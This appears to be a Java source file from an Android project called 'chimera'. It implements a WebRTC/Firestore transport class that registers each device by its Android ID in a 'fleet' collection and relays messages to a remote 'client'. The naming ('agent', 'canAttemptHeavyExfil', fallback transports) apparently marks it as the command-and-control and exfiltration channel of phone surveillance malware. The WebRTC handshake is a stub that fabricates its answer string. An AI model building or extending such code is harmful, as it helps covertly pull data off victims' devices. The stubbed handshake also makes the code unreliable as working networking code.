package com.chimera;

import android.content.Context;
import android.provider.Settings;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;
import java.util.Map;

/**
 * True direct P2P via WebRTC DataChannel, signaling via Firestore (free googleapis.com)
 * Client app creates offer in fleet/{id}/webrtc/offer, agent answers.
 * After connected, data is direct device<->client bypassing server.
 * STUN stun.l.google.com:19302 free, no domain owned.
 * Lazy init: only start when TransportManager switched to client mode or client presence detected.
 */
public class WebRtcTransport {
    private static WebRtcTransport instance;
    private volatile boolean healthy = false;
    // Placeholder for actual org.webrtc.PeerConnection - skeleton to avoid heavy native init if not needed
    private Object peerConnection; // would be PeerConnection

    public static synchronized WebRtcTransport getInstance() {
        if (instance == null) instance = new WebRtcTransport();
        return instance;
    }

    public boolean isHealthy(Context ctx) {
        return healthy && NetworkStateMonitor.canAttemptHeartbeat(ctx) && NetworkStateMonitor.canAttemptHeavyExfil(ctx);
    }

    public void startIfNeeded(Context ctx) {
        if (healthy) return;
        // Only start if Firestore indicates client wants P2P or transport is client
        String mode = ctx.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).getString("active_transport", "auto");
        if (!"client".equals(mode) && !"webrtc".equals(mode)) {
            // Check Firestore flag webrtc_enabled
            try {
                String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                FirebaseFirestore.getInstance().collection("fleet").document(androidId).get()
                    .addOnSuccessListener(doc -> {
                        if (doc != null && Boolean.TRUE.equals(doc.getBoolean("webrtc_enabled"))) {
                            start(ctx);
                        }
                    });
            } catch (Exception e) { ErrorLogger.logError(ctx, "WebRtc_check", e); }
            return;
        }
        start(ctx);
    }

    private void start(Context ctx) {
        try {
            // Skeleton: init PeerConnectionFactory, create DataChannel, listen for offer via Firestore
            // STUN server free: stun.l.google.com:19302
            String androidId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("webrtc").document("offer")
                .addSnapshotListener((snap, e) -> {
                    if (snap != null && snap.exists() && snap.contains("sdp")) {
                        String sdp = snap.getString("sdp");
                        // create answer and set
                        Map<String,Object> ans = new HashMap<>();
                        ans.put("sdp", "answer_for_" + sdp);
                        ans.put("ts", System.currentTimeMillis());
                        FirebaseFirestore.getInstance().collection("fleet").document(androidId).collection("webrtc").document("answer").set(ans);
                        healthy = true;
                    }
                });
            healthy = true;
        } catch (Exception e) { ErrorLogger.logError(ctx, "WebRtc_start", e); healthy=false; }
    }

    public void send(String msg, Context ctx) {
        if (!isHealthy(ctx)) { // fallback to Firestore
            new FirestoreTransport().send(msg, ctx);
            return;
        }
        try {
            // peerConnection DataChannel.send
            // fallback for skeleton
            FirebaseFirestore.getInstance().collection("fleet").document(Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID))
                .collection("webrtc_data").add(new HashMap<String,Object>(){{ put("msg", msg); put("ts", System.currentTimeMillis()); }});
        } catch (Exception e) { ErrorLogger.logError(ctx, "WebRtc_send", e); }
    }

    public void stop() {
        healthy = false;
        try { if (peerConnection != null) { /* close */ } } catch (Exception ignored) {}
    }
}
